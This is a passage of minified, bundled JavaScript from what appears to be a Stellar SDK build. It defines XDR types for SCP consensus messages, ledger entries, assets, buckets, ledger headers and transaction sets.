                        ee = 0)); K >= 8; X[F + pe] = 255 & ae,
                        pe += ye,
                        ae /= 256,
                        K -= 8)
                            ;
                        for (ee = ee << K | ae,
                        oe += K; oe > 0; X[F + pe] = 255 & ee,
                        pe += ye,
                        ee /= 256,
                        oe -= 8)
                            ;
                        X[F + pe - ye] |= 128 * be
                    }
                }
            }
              , O = {};
            function x(w) {
                var b = O[w];
                if (b !== void 0)
                    return b.exports;
                var X = O[w] = {
                    exports: {}
                };
                return j[w](X, X.exports, x),
                X.exports
            }
            return x.d = (w, b) => {
                for (var X in b)
                    x.o(b, X) && !x.o(w, X) && Object.defineProperty(w, X, {
                        enumerable: !0,
                        get: b[X]
                    })
            }
            ,
            x.g = function() {
                if (typeof globalThis == "object")
                    return globalThis;
                try {
                    return this || new Function("return this")()
                } catch {
                    if (typeof window == "object")
                        return window
                }
            }(),
            x.o = (w, b) => Object.prototype.hasOwnProperty.call(w, b),
            x.r = w => {
                typeof Symbol < "u" && Symbol.toStringTag && Object.defineProperty(w, Symbol.toStringTag, {
                    value: "Module"
                }),
                Object.defineProperty(w, "__esModule", {
                    value: !0
                })
            }
            ,
            x(281)
        }
        )())
    }(xdr$1)),
    xdr$1.exports
}
var hasRequiredCurr_generated;
function requireCurr_generated() {
    return hasRequiredCurr_generated || (hasRequiredCurr_generated = 1,
    function(_) {
        function M(b) {
            "@babel/helpers - typeof";
            return M = typeof Symbol == "function" && typeof Symbol.iterator == "symbol" ? function(X) {
                return typeof X
            }
            : function(X) {
                return X && typeof Symbol == "function" && X.constructor === Symbol && X !== Symbol.prototype ? "symbol" : typeof X
            }
            ,
            M(b)
        }
        Object.defineProperty(_, "__esModule", {
            value: !0
        }),
        _.default = void 0;
        var j = x(requireXdr$1());
        function O(b) {
            if (typeof WeakMap != "function")
                return null;
            var X = new WeakMap
              , Y = new WeakMap;
            return (O = function(V) {
                return V ? Y : X
            }
            )(b)
        }
        function x(b, X) {
            if (b && b.__esModule)
                return b;
            if (b === null || M(b) != "object" && typeof b != "function")
                return {
                    default: b
                };
            var Y = O(X);
            if (Y && Y.has(b))
                return Y.get(b);
            var F = {
                __proto__: null
            }
              , V = Object.defineProperty && Object.getOwnPropertyDescriptor;
            for (var K in b)
                if (K !== "default" && {}.hasOwnProperty.call(b, K)) {
                    var Q = V ? Object.getOwnPropertyDescriptor(b, K) : null;
                    Q && (Q.get || Q.set) ? Object.defineProperty(F, K, Q) : F[K] = b[K]
                }
            return F.default = b,
            Y && Y.set(b, F),
            F
        }
        var w = j.config(function(b) {
            var X = 32
              , Y = 1024;
            b.typedef("Value", b.varOpaque()),
            b.struct("ScpBallot", [["counter", b.lookup("Uint32")], ["value", b.lookup("Value")]]),
            b.enum("ScpStatementType", {
                scpStPrepare: 0,
                scpStConfirm: 1,
                scpStExternalize: 2,
                scpStNominate: 3
            }),
            b.struct("ScpNomination", [["quorumSetHash", b.lookup("Hash")], ["votes", b.varArray(b.lookup("Value"), 2147483647)], ["accepted", b.varArray(b.lookup("Value"), 2147483647)]]),
            b.struct("ScpStatementPrepare", [["quorumSetHash", b.lookup("Hash")], ["ballot", b.lookup("ScpBallot")], ["prepared", b.option(b.lookup("ScpBallot"))], ["preparedPrime", b.option(b.lookup("ScpBallot"))], ["nC", b.lookup("Uint32")], ["nH", b.lookup("Uint32")]]),
            b.struct("ScpStatementConfirm", [["ballot", b.lookup("ScpBallot")], ["nPrepared", b.lookup("Uint32")], ["nCommit", b.lookup("Uint32")], ["nH", b.lookup("Uint32")], ["quorumSetHash", b.lookup("Hash")]]),
            b.struct("ScpStatementExternalize", [["commit", b.lookup("ScpBallot")], ["nH", b.lookup("Uint32")], ["commitQuorumSetHash", b.lookup("Hash")]]),
            b.union("ScpStatementPledges", {
                switchOn: b.lookup("ScpStatementType"),
                switchName: "type",
                switches: [["scpStPrepare", "prepare"], ["scpStConfirm", "confirm"], ["scpStExternalize", "externalize"], ["scpStNominate", "nominate"]],
                arms: {
                    prepare: b.lookup("ScpStatementPrepare"),
                    confirm: b.lookup("ScpStatementConfirm"),
                    externalize: b.lookup("ScpStatementExternalize"),
                    nominate: b.lookup("ScpNomination")
                }
            }),
            b.struct("ScpStatement", [["nodeId", b.lookup("NodeId")], ["slotIndex", b.lookup("Uint64")], ["pledges", b.lookup("ScpStatementPledges")]]),
            b.struct("ScpEnvelope", [["statement", b.lookup("ScpStatement")], ["signature", b.lookup("Signature")]]),
            b.struct("ScpQuorumSet", [["threshold", b.lookup("Uint32")], ["validators", b.varArray(b.lookup("NodeId"), 2147483647)], ["innerSets", b.varArray(b.lookup("ScpQuorumSet"), 2147483647)]]),
            b.typedef("Thresholds", b.opaque(4)),
            b.typedef("String32", b.string(32)),
            b.typedef("String64", b.string(64)),
            b.typedef("SequenceNumber", b.lookup("Int64")),
            b.typedef("DataValue", b.varOpaque(64)),
            b.typedef("PoolId", b.lookup("Hash")),
            b.typedef("AssetCode4", b.opaque(4)),
            b.typedef("AssetCode12", b.opaque(12)),
            b.enum("AssetType", {
                assetTypeNative: 0,
                assetTypeCreditAlphanum4: 1,
                assetTypeCreditAlphanum12: 2,
                assetTypePoolShare: 3
            }),
            b.union("AssetCode", {
                switchOn: b.lookup("AssetType"),
                switchName: "type",
                switches: [["assetTypeCreditAlphanum4", "assetCode4"], ["assetTypeCreditAlphanum12", "assetCode12"]],
                arms: {
                    assetCode4: b.lookup("AssetCode4"),
                    assetCode12: b.lookup("AssetCode12")
                }
            }),
            b.struct("AlphaNum4", [["assetCode", b.lookup("AssetCode4")], ["issuer", b.lookup("AccountId")]]),
            b.struct("AlphaNum12", [["assetCode", b.lookup("AssetCode12")], ["issuer", b.lookup("AccountId")]]),
            b.union("Asset", {
                switchOn: b.lookup("AssetType"),
                switchName: "type",
                switches: [["assetTypeNative", b.void()], ["assetTypeCreditAlphanum4", "alphaNum4"], ["assetTypeCreditAlphanum12", "alphaNum12"]],
                arms: {
                    alphaNum4: b.lookup("AlphaNum4"),
                    alphaNum12: b.lookup("AlphaNum12")
                }
            }),
            b.struct("Price", [["n", b.lookup("Int32")], ["d", b.lookup("Int32")]]),
            b.struct("Liabilities", [["buying", b.lookup("Int64")], ["selling", b.lookup("Int64")]]),
            b.enum("ThresholdIndices", {
                thresholdMasterWeight: 0,
                thresholdLow: 1,
                thresholdMed: 2,
                thresholdHigh: 3
            }),
            b.enum("LedgerEntryType", {
                account: 0,
                trustline: 1,
                offer: 2,
                data: 3,
                claimableBalance: 4,
                liquidityPool: 5,
                contractData: 6,
                contractCode: 7,
                configSetting: 8,
                ttl: 9
            }),
            b.struct("Signer", [["key", b.lookup("SignerKey")], ["weight", b.lookup("Uint32")]]),
            b.enum("AccountFlags", {
                authRequiredFlag: 1,
                authRevocableFlag: 2,
                authImmutableFlag: 4,
                authClawbackEnabledFlag: 8
            }),
            b.const("MASK_ACCOUNT_FLAGS", 7),
            b.const("MASK_ACCOUNT_FLAGS_V17", 15),
            b.const("MAX_SIGNERS", 20),
            b.typedef("SponsorshipDescriptor", b.option(b.lookup("AccountId"))),
            b.struct("AccountEntryExtensionV3", [["ext", b.lookup("ExtensionPoint")], ["seqLedger", b.lookup("Uint32")], ["seqTime", b.lookup("TimePoint")]]),
            b.union("AccountEntryExtensionV2Ext", {
                switchOn: b.int(),
                switchName: "v",
                switches: [[0, b.void()], [3, "v3"]],
                arms: {
                    v3: b.lookup("AccountEntryExtensionV3")
                }
            }),
            b.struct("AccountEntryExtensionV2", [["numSponsored", b.lookup("Uint32")], ["numSponsoring", b.lookup("Uint32")], ["signerSponsoringIDs", b.varArray(b.lookup("SponsorshipDescriptor"), b.lookup("MAX_SIGNERS"))], ["ext", b.lookup("AccountEntryExtensionV2Ext")]]),
            b.union("AccountEntryExtensionV1Ext", {
                switchOn: b.int(),
                switchName: "v",
                switches: [[0, b.void()], [2, "v2"]],
                arms: {
                    v2: b.lookup("AccountEntryExtensionV2")
                }
            }),
            b.struct("AccountEntryExtensionV1", [["liabilities", b.lookup("Liabilities")], ["ext", b.lookup("AccountEntryExtensionV1Ext")]]),
            b.union("AccountEntryExt", {
                switchOn: b.int(),
                switchName: "v",
                switches: [[0, b.void()], [1, "v1"]],
                arms: {
                    v1: b.lookup("AccountEntryExtensionV1")
                }
            }),
            b.struct("AccountEntry", [["accountId", b.lookup("AccountId")], ["balance", b.lookup("Int64")], ["seqNum", b.lookup("SequenceNumber")], ["numSubEntries", b.lookup("Uint32")], ["inflationDest", b.option(b.lookup("AccountId"))], ["flags", b.lookup("Uint32")], ["homeDomain", b.lookup("String32")], ["thresholds", b.lookup("Thresholds")], ["signers", b.varArray(b.lookup("Signer"), b.lookup("MAX_SIGNERS"))], ["ext", b.lookup("AccountEntryExt")]]),
            b.enum("TrustLineFlags", {
                authorizedFlag: 1,
                authorizedToMaintainLiabilitiesFlag: 2,
                trustlineClawbackEnabledFlag: 4
            }),
            b.const("MASK_TRUSTLINE_FLAGS", 1),
            b.const("MASK_TRUSTLINE_FLAGS_V13", 3),
            b.const("MASK_TRUSTLINE_FLAGS_V17", 7),
            b.enum("LiquidityPoolType", {
                liquidityPoolConstantProduct: 0
            }),
            b.union("TrustLineAsset", {
                switchOn: b.lookup("AssetType"),
                switchName: "type",
                switches: [["assetTypeNative", b.void()], ["assetTypeCreditAlphanum4", "alphaNum4"], ["assetTypeCreditAlphanum12", "alphaNum12"], ["assetTypePoolShare", "liquidityPoolId"]],
                arms: {
                    alphaNum4: b.lookup("AlphaNum4"),
                    alphaNum12: b.lookup("AlphaNum12"),
                    liquidityPoolId: b.lookup("PoolId")
                }
            }),
            b.union("TrustLineEntryExtensionV2Ext", {
                switchOn: b.int(),
                switchName: "v",
                switches: [[0, b.void()]],
                arms: {}
            }),
            b.struct("TrustLineEntryExtensionV2", [["liquidityPoolUseCount", b.lookup("Int32")], ["ext", b.lookup("TrustLineEntryExtensionV2Ext")]]),
            b.union("TrustLineEntryV1Ext", {
                switchOn: b.int(),
                switchName: "v",
                switches: [[0, b.void()], [2, "v2"]],
                arms: {
                    v2: b.lookup("TrustLineEntryExtensionV2")
                }
            }),
            b.struct("TrustLineEntryV1", [["liabilities", b.lookup("Liabilities")], ["ext", b.lookup("TrustLineEntryV1Ext")]]),
            b.union("TrustLineEntryExt", {
                switchOn: b.int(),
                switchName: "v",
                switches: [[0, b.void()], [1, "v1"]],
                arms: {
                    v1: b.lookup("TrustLineEntryV1")
                }
            }),
            b.struct("TrustLineEntry", [["accountId", b.lookup("AccountId")], ["asset", b.lookup("TrustLineAsset")], ["balance", b.lookup("Int64")], ["limit", b.lookup("Int64")], ["flags", b.lookup("Uint32")], ["ext", b.lookup("TrustLineEntryExt")]]),
            b.enum("OfferEntryFlags", {
                passiveFlag: 1
            }),
            b.const("MASK_OFFERENTRY_FLAGS", 1),
            b.union("OfferEntryExt", {
                switchOn: b.int(),
                switchName: "v",
                switches: [[0, b.void()]],
                arms: {}
            }),
            b.struct("OfferEntry", [["sellerId", b.lookup("AccountId")], ["offerId", b.lookup("Int64")], ["selling", b.lookup("Asset")], ["buying", b.lookup("Asset")], ["amount", b.lookup("Int64")], ["price", b.lookup("Price")], ["flags", b.lookup("Uint32")], ["ext", b.lookup("OfferEntryExt")]]),
            b.union("DataEntryExt", {
                switchOn: b.int(),
                switchName: "v",
                switches: [[0, b.void()]],
                arms: {}
            }),
            b.struct("DataEntry", [["accountId", b.lookup("AccountId")], ["dataName", b.lookup("String64")], ["dataValue", b.lookup("DataValue")], ["ext", b.lookup("DataEntryExt")]]),
            b.enum("ClaimPredicateType", {
                claimPredicateUnconditional: 0,
                claimPredicateAnd: 1,
                claimPredicateOr: 2,
                claimPredicateNot: 3,
                claimPredicateBeforeAbsoluteTime: 4,
                claimPredicateBeforeRelativeTime: 5
            }),
            b.union("ClaimPredicate", {
                switchOn: b.lookup("ClaimPredicateType"),
                switchName: "type",
                switches: [["claimPredicateUnconditional", b.void()], ["claimPredicateAnd", "andPredicates"], ["claimPredicateOr", "orPredicates"], ["claimPredicateNot", "notPredicate"], ["claimPredicateBeforeAbsoluteTime", "absBefore"], ["claimPredicateBeforeRelativeTime", "relBefore"]],
                arms: {
                    andPredicates: b.varArray(b.lookup("ClaimPredicate"), 2),
                    orPredicates: b.varArray(b.lookup("ClaimPredicate"), 2),
                    notPredicate: b.option(b.lookup("ClaimPredicate")),
                    absBefore: b.lookup("Int64"),
                    relBefore: b.lookup("Int64")
                }
            }),
            b.enum("ClaimantType", {
                claimantTypeV0: 0
            }),
            b.struct("ClaimantV0", [["destination", b.lookup("AccountId")], ["predicate", b.lookup("ClaimPredicate")]]),
            b.union("Claimant", {
                switchOn: b.lookup("ClaimantType"),
                switchName: "type",
                switches: [["claimantTypeV0", "v0"]],
                arms: {
                    v0: b.lookup("ClaimantV0")
                }
            }),
            b.enum("ClaimableBalanceIdType", {
                claimableBalanceIdTypeV0: 0
            }),
            b.union("ClaimableBalanceId", {
                switchOn: b.lookup("ClaimableBalanceIdType"),
                switchName: "type",
                switches: [["claimableBalanceIdTypeV0", "v0"]],
                arms: {
                    v0: b.lookup("Hash")
                }
            }),
            b.enum("ClaimableBalanceFlags", {
                claimableBalanceClawbackEnabledFlag: 1
            }),
            b.const("MASK_CLAIMABLE_BALANCE_FLAGS", 1),
            b.union("ClaimableBalanceEntryExtensionV1Ext", {
                switchOn: b.int(),
                switchName: "v",
                switches: [[0, b.void()]],
                arms: {}
            }),
            b.struct("ClaimableBalanceEntryExtensionV1", [["ext", b.lookup("ClaimableBalanceEntryExtensionV1Ext")], ["flags", b.lookup("Uint32")]]),
            b.union("ClaimableBalanceEntryExt", {
                switchOn: b.int(),
                switchName: "v",
                switches: [[0, b.void()], [1, "v1"]],
                arms: {
                    v1: b.lookup("ClaimableBalanceEntryExtensionV1")
                }
            }),
            b.struct("ClaimableBalanceEntry", [["balanceId", b.lookup("ClaimableBalanceId")], ["claimants", b.varArray(b.lookup("Claimant"), 10)], ["asset", b.lookup("Asset")], ["amount", b.lookup("Int64")], ["ext", b.lookup("ClaimableBalanceEntryExt")]]),
            b.struct("LiquidityPoolConstantProductParameters", [["assetA", b.lookup("Asset")], ["assetB", b.lookup("Asset")], ["fee", b.lookup("Int32")]]),
            b.struct("LiquidityPoolEntryConstantProduct", [["params", b.lookup("LiquidityPoolConstantProductParameters")], ["reserveA", b.lookup("Int64")], ["reserveB", b.lookup("Int64")], ["totalPoolShares", b.lookup("Int64")], ["poolSharesTrustLineCount", b.lookup("Int64")]]),
            b.union("LiquidityPoolEntryBody", {
                switchOn: b.lookup("LiquidityPoolType"),
                switchName: "type",
                switches: [["liquidityPoolConstantProduct", "constantProduct"]],
                arms: {
                    constantProduct: b.lookup("LiquidityPoolEntryConstantProduct")
                }
            }),
            b.struct("LiquidityPoolEntry", [["liquidityPoolId", b.lookup("PoolId")], ["body", b.lookup("LiquidityPoolEntryBody")]]),
            b.enum("ContractDataDurability", {
                temporary: 0,
                persistent: 1
            }),
            b.struct("ContractDataEntry", [["ext", b.lookup("ExtensionPoint")], ["contract", b.lookup("ScAddress")], ["key", b.lookup("ScVal")], ["durability", b.lookup("ContractDataDurability")], ["val", b.lookup("ScVal")]]),
            b.struct("ContractCodeCostInputs", [["ext", b.lookup("ExtensionPoint")], ["nInstructions", b.lookup("Uint32")], ["nFunctions", b.lookup("Uint32")], ["nGlobals", b.lookup("Uint32")], ["nTableEntries", b.lookup("Uint32")], ["nTypes", b.lookup("Uint32")], ["nDataSegments", b.lookup("Uint32")], ["nElemSegments", b.lookup("Uint32")], ["nImports", b.lookup("Uint32")], ["nExports", b.lookup("Uint32")], ["nDataSegmentBytes", b.lookup("Uint32")]]),
            b.struct("ContractCodeEntryV1", [["ext", b.lookup("ExtensionPoint")], ["costInputs", b.lookup("ContractCodeCostInputs")]]),
            b.union("ContractCodeEntryExt", {
                switchOn: b.int(),
                switchName: "v",
                switches: [[0, b.void()], [1, "v1"]],
                arms: {
                    v1: b.lookup("ContractCodeEntryV1")
                }
            }),
            b.struct("ContractCodeEntry", [["ext", b.lookup("ContractCodeEntryExt")], ["hash", b.lookup("Hash")], ["code", b.varOpaque()]]),
            b.struct("TtlEntry", [["keyHash", b.lookup("Hash")], ["liveUntilLedgerSeq", b.lookup("Uint32")]]),
            b.union("LedgerEntryExtensionV1Ext", {
                switchOn: b.int(),
                switchName: "v",
                switches: [[0, b.void()]],
                arms: {}
            }),
            b.struct("LedgerEntryExtensionV1", [["sponsoringId", b.lookup("SponsorshipDescriptor")], ["ext", b.lookup("LedgerEntryExtensionV1Ext")]]),
            b.union("LedgerEntryData", {
                switchOn: b.lookup("LedgerEntryType"),
                switchName: "type",
                switches: [["account", "account"], ["trustline", "trustLine"], ["offer", "offer"], ["data", "data"], ["claimableBalance", "claimableBalance"], ["liquidityPool", "liquidityPool"], ["contractData", "contractData"], ["contractCode", "contractCode"], ["configSetting", "configSetting"], ["ttl", "ttl"]],
                arms: {
                    account: b.lookup("AccountEntry"),
                    trustLine: b.lookup("TrustLineEntry"),
                    offer: b.lookup("OfferEntry"),
                    data: b.lookup("DataEntry"),
                    claimableBalance: b.lookup("ClaimableBalanceEntry"),
                    liquidityPool: b.lookup("LiquidityPoolEntry"),
                    contractData: b.lookup("ContractDataEntry"),
                    contractCode: b.lookup("ContractCodeEntry"),
                    configSetting: b.lookup("ConfigSettingEntry"),
                    ttl: b.lookup("TtlEntry")
                }
            }),
            b.union("LedgerEntryExt", {
                switchOn: b.int(),
                switchName: "v",
                switches: [[0, b.void()], [1, "v1"]],
                arms: {
                    v1: b.lookup("LedgerEntryExtensionV1")
                }
            }),
            b.struct("LedgerEntry", [["lastModifiedLedgerSeq", b.lookup("Uint32")], ["data", b.lookup("LedgerEntryData")], ["ext", b.lookup("LedgerEntryExt")]]),
            b.struct("LedgerKeyAccount", [["accountId", b.lookup("AccountId")]]),
            b.struct("LedgerKeyTrustLine", [["accountId", b.lookup("AccountId")], ["asset", b.lookup("TrustLineAsset")]]),
            b.struct("LedgerKeyOffer", [["sellerId", b.lookup("AccountId")], ["offerId", b.lookup("Int64")]]),
            b.struct("LedgerKeyData", [["accountId", b.lookup("AccountId")], ["dataName", b.lookup("String64")]]),
            b.struct("LedgerKeyClaimableBalance", [["balanceId", b.lookup("ClaimableBalanceId")]]),
            b.struct("LedgerKeyLiquidityPool", [["liquidityPoolId", b.lookup("PoolId")]]),
            b.struct("LedgerKeyContractData", [["contract", b.lookup("ScAddress")], ["key", b.lookup("ScVal")], ["durability", b.lookup("ContractDataDurability")]]),
            b.struct("LedgerKeyContractCode", [["hash", b.lookup("Hash")]]),
            b.struct("LedgerKeyConfigSetting", [["configSettingId", b.lookup("ConfigSettingId")]]),
            b.struct("LedgerKeyTtl", [["keyHash", b.lookup("Hash")]]),
            b.union("LedgerKey", {
                switchOn: b.lookup("LedgerEntryType"),
                switchName: "type",
                switches: [["account", "account"], ["trustline", "trustLine"], ["offer", "offer"], ["data", "data"], ["claimableBalance", "claimableBalance"], ["liquidityPool", "liquidityPool"], ["contractData", "contractData"], ["contractCode", "contractCode"], ["configSetting", "configSetting"], ["ttl", "ttl"]],
                arms: {
                    account: b.lookup("LedgerKeyAccount"),
                    trustLine: b.lookup("LedgerKeyTrustLine"),
                    offer: b.lookup("LedgerKeyOffer"),
                    data: b.lookup("LedgerKeyData"),
                    claimableBalance: b.lookup("LedgerKeyClaimableBalance"),
                    liquidityPool: b.lookup("LedgerKeyLiquidityPool"),
                    contractData: b.lookup("LedgerKeyContractData"),
                    contractCode: b.lookup("LedgerKeyContractCode"),
                    configSetting: b.lookup("LedgerKeyConfigSetting"),
                    ttl: b.lookup("LedgerKeyTtl")
                }
            }),
            b.enum("EnvelopeType", {
                envelopeTypeTxV0: 0,
                envelopeTypeScp: 1,
                envelopeTypeTx: 2,
                envelopeTypeAuth: 3,
                envelopeTypeScpvalue: 4,
                envelopeTypeTxFeeBump: 5,
                envelopeTypeOpId: 6,
                envelopeTypePoolRevokeOpId: 7,
                envelopeTypeContractId: 8,
                envelopeTypeSorobanAuthorization: 9
            }),
            b.enum("BucketListType", {
                live: 0,
                hotArchive: 1,
                coldArchive: 2
            }),
            b.enum("BucketEntryType", {
                metaentry: -1,
                liveentry: 0,
                deadentry: 1,
                initentry: 2
            }),
            b.enum("HotArchiveBucketEntryType", {
                hotArchiveMetaentry: -1,
                hotArchiveArchived: 0,
                hotArchiveLive: 1,
                hotArchiveDeleted: 2
            }),
            b.enum("ColdArchiveBucketEntryType", {
                coldArchiveMetaentry: -1,
                coldArchiveArchivedLeaf: 0,
                coldArchiveDeletedLeaf: 1,
                coldArchiveBoundaryLeaf: 2,
                coldArchiveHash: 3
            }),
            b.union("BucketMetadataExt", {
                switchOn: b.int(),
                switchName: "v",
                switches: [[0, b.void()], [1, "bucketListType"]],
                arms: {
                    bucketListType: b.lookup("BucketListType")
                }
            }),
            b.struct("BucketMetadata", [["ledgerVersion", b.lookup("Uint32")], ["ext", b.lookup("BucketMetadataExt")]]),
            b.union("BucketEntry", {
                switchOn: b.lookup("BucketEntryType"),
                switchName: "type",
                switches: [["liveentry", "liveEntry"], ["initentry", "liveEntry"], ["deadentry", "deadEntry"], ["metaentry", "metaEntry"]],
                arms: {
                    liveEntry: b.lookup("LedgerEntry"),
                    deadEntry: b.lookup("LedgerKey"),
                    metaEntry: b.lookup("BucketMetadata")
                }
            }),
            b.union("HotArchiveBucketEntry", {
                switchOn: b.lookup("HotArchiveBucketEntryType"),
                switchName: "type",
                switches: [["hotArchiveArchived", "archivedEntry"], ["hotArchiveLive", "key"], ["hotArchiveDeleted", "key"], ["hotArchiveMetaentry", "metaEntry"]],
                arms: {
                    archivedEntry: b.lookup("LedgerEntry"),
                    key: b.lookup("LedgerKey"),
                    metaEntry: b.lookup("BucketMetadata")
                }
            }),
            b.struct("ColdArchiveArchivedLeaf", [["index", b.lookup("Uint32")], ["archivedEntry", b.lookup("LedgerEntry")]]),
            b.struct("ColdArchiveDeletedLeaf", [["index", b.lookup("Uint32")], ["deletedKey", b.lookup("LedgerKey")]]),
            b.struct("ColdArchiveBoundaryLeaf", [["index", b.lookup("Uint32")], ["isLowerBound", b.bool()]]),
            b.struct("ColdArchiveHashEntry", [["index", b.lookup("Uint32")], ["level", b.lookup("Uint32")], ["hash", b.lookup("Hash")]]),
            b.union("ColdArchiveBucketEntry", {
                switchOn: b.lookup("ColdArchiveBucketEntryType"),
                switchName: "type",
                switches: [["coldArchiveMetaentry", "metaEntry"], ["coldArchiveArchivedLeaf", "archivedLeaf"], ["coldArchiveDeletedLeaf", "deletedLeaf"], ["coldArchiveBoundaryLeaf", "boundaryLeaf"], ["coldArchiveHash", "hashEntry"]],
                arms: {
                    metaEntry: b.lookup("BucketMetadata"),
                    archivedLeaf: b.lookup("ColdArchiveArchivedLeaf"),
                    deletedLeaf: b.lookup("ColdArchiveDeletedLeaf"),
                    boundaryLeaf: b.lookup("ColdArchiveBoundaryLeaf"),
                    hashEntry: b.lookup("ColdArchiveHashEntry")
                }
            }),
            b.typedef("UpgradeType", b.varOpaque(128)),
            b.enum("StellarValueType", {
                stellarValueBasic: 0,
                stellarValueSigned: 1
            }),
            b.struct("LedgerCloseValueSignature", [["nodeId", b.lookup("NodeId")], ["signature", b.lookup("Signature")]]),
            b.union("StellarValueExt", {
                switchOn: b.lookup("StellarValueType"),
                switchName: "v",
                switches: [["stellarValueBasic", b.void()], ["stellarValueSigned", "lcValueSignature"]],
                arms: {
                    lcValueSignature: b.lookup("LedgerCloseValueSignature")
                }
            }),
            b.struct("StellarValue", [["txSetHash", b.lookup("Hash")], ["closeTime", b.lookup("TimePoint")], ["upgrades", b.varArray(b.lookup("UpgradeType"), 6)], ["ext", b.lookup("StellarValueExt")]]),
            b.const("MASK_LEDGER_HEADER_FLAGS", 7),
            b.enum("LedgerHeaderFlags", {
                disableLiquidityPoolTradingFlag: 1,
                disableLiquidityPoolDepositFlag: 2,
                disableLiquidityPoolWithdrawalFlag: 4
            }),
            b.union("LedgerHeaderExtensionV1Ext", {
                switchOn: b.int(),
                switchName: "v",
                switches: [[0, b.void()]],
                arms: {}
            }),
            b.struct("LedgerHeaderExtensionV1", [["flags", b.lookup("Uint32")], ["ext", b.lookup("LedgerHeaderExtensionV1Ext")]]),
            b.union("LedgerHeaderExt", {
                switchOn: b.int(),
                switchName: "v",
                switches: [[0, b.void()], [1, "v1"]],
                arms: {
                    v1: b.lookup("LedgerHeaderExtensionV1")
                }
            }),
            b.struct("LedgerHeader", [["ledgerVersion", b.lookup("Uint32")], ["previousLedgerHash", b.lookup("Hash")], ["scpValue", b.lookup("StellarValue")], ["txSetResultHash", b.lookup("Hash")], ["bucketListHash", b.lookup("Hash")], ["ledgerSeq", b.lookup("Uint32")], ["totalCoins", b.lookup("Int64")], ["feePool", b.lookup("Int64")], ["inflationSeq", b.lookup("Uint32")], ["idPool", b.lookup("Uint64")], ["baseFee", b.lookup("Uint32")], ["baseReserve", b.lookup("Uint32")], ["maxTxSetSize", b.lookup("Uint32")], ["skipList", b.array(b.lookup("Hash"), 4)], ["ext", b.lookup("LedgerHeaderExt")]]),
            b.enum("LedgerUpgradeType", {
                ledgerUpgradeVersion: 1,
                ledgerUpgradeBaseFee: 2,
                ledgerUpgradeMaxTxSetSize: 3,
                ledgerUpgradeBaseReserve: 4,
                ledgerUpgradeFlags: 5,
                ledgerUpgradeConfig: 6,
                ledgerUpgradeMaxSorobanTxSetSize: 7
            }),
            b.struct("ConfigUpgradeSetKey", [["contractId", b.lookup("Hash")], ["contentHash", b.lookup("Hash")]]),
            b.union("LedgerUpgrade", {
                switchOn: b.lookup("LedgerUpgradeType"),
                switchName: "type",
                switches: [["ledgerUpgradeVersion", "newLedgerVersion"], ["ledgerUpgradeBaseFee", "newBaseFee"], ["ledgerUpgradeMaxTxSetSize", "newMaxTxSetSize"], ["ledgerUpgradeBaseReserve", "newBaseReserve"], ["ledgerUpgradeFlags", "newFlags"], ["ledgerUpgradeConfig", "newConfig"], ["ledgerUpgradeMaxSorobanTxSetSize", "newMaxSorobanTxSetSize"]],
                arms: {
                    newLedgerVersion: b.lookup("Uint32"),
                    newBaseFee: b.lookup("Uint32"),
                    newMaxTxSetSize: b.lookup("Uint32"),
                    newBaseReserve: b.lookup("Uint32"),
                    newFlags: b.lookup("Uint32"),
                    newConfig: b.lookup("ConfigUpgradeSetKey"),
                    newMaxSorobanTxSetSize: b.lookup("Uint32")
                }
            }),
            b.struct("ConfigUpgradeSet", [["updatedEntry", b.varArray(b.lookup("ConfigSettingEntry"), 2147483647)]]),
            b.enum("TxSetComponentType", {
                txsetCompTxsMaybeDiscountedFee: 0
            }),
            b.struct("TxSetComponentTxsMaybeDiscountedFee", [["baseFee", b.option(b.lookup("Int64"))], ["txes", b.varArray(b.lookup("TransactionEnvelope"), 2147483647)]]),
            b.union("TxSetComponent", {
                switchOn: b.lookup("TxSetComponentType"),
                switchName: "type",
                switches: [["txsetCompTxsMaybeDiscountedFee", "txsMaybeDiscountedFee"]],
                arms: {
                    txsMaybeDiscountedFee: b.lookup("TxSetComponentTxsMaybeDiscountedFee")
                }
            }),
            b.union("TransactionPhase", {
                switchOn: b.int(),
                switchName: "v",
                switches: [[0, "v0Components"]],
                arms: {
                    v0Components: b.varArray(b.lookup("TxSetComponent"), 2147483647)
                }
            }),
            b.struct("TransactionSet", [["previousLedgerHash", b.lookup("Hash")], ["txes", b.varArray(b.lookup("TransactionEnvelope"), 2147483647)]]),
            b.struct("TransactionSetV1", [["previousLedgerHash", b.lookup("Hash")], ["phases", b.varArray(b.lookup("TransactionPhase"), 2147483647)]]),
            b.union("GeneralizedTransactionSet", {
                switchOn: b.int(),
                switchName: "v",
                switches: [[1, "v1TxSet"]],
                arms: {
                    v1TxSet: b.lookup("TransactionSetV1")
                }
            }),
            b.struct("TransactionResultPair", [["transactionHash", b.lookup("Hash")], ["result", b.lookup("TransactionResult")]]),
            b.struct("TransactionResultSet", [["results", b.varArray(b.lookup("TransactionResultPair"), 2147483647)]]),
            b.union("TransactionHistoryEntryExt", {
                switchOn: b.int(),
                switchName: "v",
                switches: [[0, b.void()], [1, "generalizedTxSet"]],
                arms: {
                    generalizedTxSet: b.lookup("GeneralizedTransactionSet")
                }
            }),
            b.struct("TransactionHistoryEntry", [["ledgerSeq", b.lookup("Uint32")], ["txSet", b.lookup("TransactionSet")], ["ext", b.lookup("TransactionHistoryEntryExt")]]),
            b.union("TransactionHistoryResultEntryExt", {
                switchOn: b.int(),
                switchName: "v",
                switches: [[0, b.void()]],
                arms: {}
            }),
            b.struct("TransactionHistoryResultEntry", [["ledgerSeq", b.lookup("Uint32")], ["txResultSet", b.lookup("TransactionResultSet")], ["ext", b.lookup("TransactionHistoryResultEntryExt")]]),
            b.union("LedgerHeaderHistoryEntryExt", {
                switchOn: b.int(),
                switchName: "v",
                switches: [[0, b.void()]],
                arms: {}
            }),
            b.struct("LedgerHeaderHistoryEntry", [["hash", b.lookup("Hash")], ["header", b.lookup("LedgerHeader")], ["ext", b.lookup("LedgerHeaderHistoryEntryExt")]]),
            b.struct("LedgerScpMessages", [["ledgerSeq", b.lookup("Uint32")], ["messages", b.varArray(b.lookup("ScpEnvelope"), 2147483647)]]),
            b.struct("ScpHistoryEntryV0", [["quorumSets", b.varArray(b.lookup("ScpQuorumSet"), 2147483647)], ["ledgerMessages", b.lookup("LedgerScpMessages")]]),
            b.union("ScpHistoryEntry", {
                switchOn: b.int(),
                switchName: "v",
                switches: [[0, "v0"]],
                arms: {
                    v0: b.lookup("ScpHistoryEntryV0")
                }
            }),
            b.enum("LedgerEntryChangeType", {
                ledgerEntryCreated: 0,
                ledgerEntryUpdated: 1,
                ledgerEntryRemoved: 2,
